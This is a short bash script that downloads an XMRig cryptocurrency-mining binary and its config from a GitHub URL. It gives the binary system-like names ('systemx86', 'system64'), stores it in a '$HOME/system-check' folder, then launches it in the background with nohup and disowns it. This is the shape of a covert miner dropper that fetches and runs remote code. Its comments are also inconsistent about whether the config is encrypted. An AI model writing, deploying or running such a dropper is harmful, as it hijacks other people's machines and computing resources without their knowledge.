#!/usr/bin/env bash
# Modified oneline.sh for encrypted XMRig config.
# Only the wallet address (user) is encrypted.

set -euo pipefail

REPO_USER="grayteams"
REPO_NAME="teams"
BRANCH="main"
RAW_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"

if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
    echo "[-] curl DAN wget tidak ditemukan (minimal salah satu wajib ada)"; exit 1;
fi
command -v uname >/dev/null 2>&1 || { echo "[-] uname tidak ditemukan"; exit 1; }

# Download helper: pakai curl kalau ada, otomatis jatuh ke wget kalau curl tidak ada
download() {
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL -o "$2" "$1"
    else
        wget -q -O "$2" "$1"
    fi
}

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN="systemx86" ;;
    aarch64|arm64) BIN="system64" ;;
    *) echo "[-] Arsitektur tidak didukung: $ARCH"; exit 1 ;;
esac

WORKDIR="$HOME/system-check"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Download encrypted config if not present
if [ ! -s config.json ]; then
    download "${RAW_URL}/config.json" config.json || { rm -f config.json; exit 1; }
fi

# Download binary if not present
if [ ! -s "$BIN" ]; then
    download "${RAW_URL}/$BIN" "$BIN" || { rm -f "$BIN"; exit 1; }
fi

[ -s config.json ] || { echo "[-] config.json kosong"; exit 1; }
[ -s "$BIN" ] || { echo "[-] binary $BIN kosong"; exit 1; }

chmod +x "$BIN"

# Run XMRig
nohup ./"$BIN" -c config.json "$@" > xmrig.log 2>&1 &
XMRIG_PID=$!
echo $XMRIG_PID > xmrig.pid
disown

echo "[+] XMRig started with plaintext config.json (wallet is public; config is not encrypted)"
